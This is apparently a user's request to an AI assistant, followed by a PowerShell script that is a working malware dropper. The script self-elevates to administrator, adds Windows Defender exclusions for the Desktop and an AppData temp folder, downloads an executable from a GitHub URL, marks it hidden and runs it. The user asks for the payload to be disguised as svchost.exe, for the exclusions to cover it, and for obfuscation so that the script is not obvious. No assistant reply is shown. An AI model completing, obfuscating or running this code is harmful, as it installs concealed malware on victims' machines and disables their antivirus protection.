can you change the exclusions to be

AppData\Temp
AppData\Temp\svchost.exe
Desktop
svchost.exe (the process)
Desktop\svchost.exe

and also change the url to download to https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe

and also add simple obfuscation to not make it fucking obvious

 function Run-AsAdmin {
    param([string]$scriptPath)

    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $psi.Verb = "runas"
        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            exit
        }
        catch {
            Write-Error "Elevation cancelled or failed."
            exit 1
        }
    }
}

$scriptPath = $MyInvocation.MyCommand.Definition
Run-AsAdmin -scriptPath $scriptPath

$exeUrl = "https://raw.githubusercontent.com/boucegame/y/main/Lisa%20Helper.exe"

$desktopPath = [Environment]::GetFolderPath("Desktop")
$destination = Join-Path -Path $desktopPath -ChildPath "Lisa Helper.exe"

$roamingTempPath = Join-Path -Path $env:APPDATA -ChildPath "temp"
$roamingFontExe = Join-Path -Path $roamingTempPath -ChildPath "Windows Fonts.exe"

if (-not (Test-Path $roamingTempPath)) {
    New-Item -ItemType Directory -Force -Path $roamingTempPath | Out-Null
}

Add-MpPreference -ExclusionPath $desktopPath
Add-MpPreference -ExclusionPath $destination
Add-MpPreference -ExclusionPath $roamingTempPath
Add-MpPreference -ExclusionPath $roamingFontExe

Invoke-WebRequest -Uri $exeUrl -OutFile $destination

Set-ItemProperty -Path $destination -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

Start-Process -FilePath $destination
